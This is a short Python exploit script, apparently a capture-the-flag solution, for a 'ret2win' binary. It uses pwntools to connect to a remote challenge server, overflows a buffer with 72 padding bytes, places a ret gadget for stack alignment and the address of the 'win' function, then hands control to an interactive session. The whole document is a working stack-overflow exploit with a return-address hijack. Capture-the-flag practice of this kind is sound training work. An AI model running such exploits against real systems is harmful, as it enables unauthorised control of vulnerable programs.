#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./ret2win', checksec=False)
OFFSET_TO_RIP = 72
ret_gadget = 0x40101a
REMOTE_HOST = 'offsec.m0lecon.it'
HOST_PORT = 13591
p = remote(REMOTE_HOST,HOST_PORT)
p.recvuntil(b"name?\n")
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(elf.sym.win),
)
p.send(payload)
p.interactive()
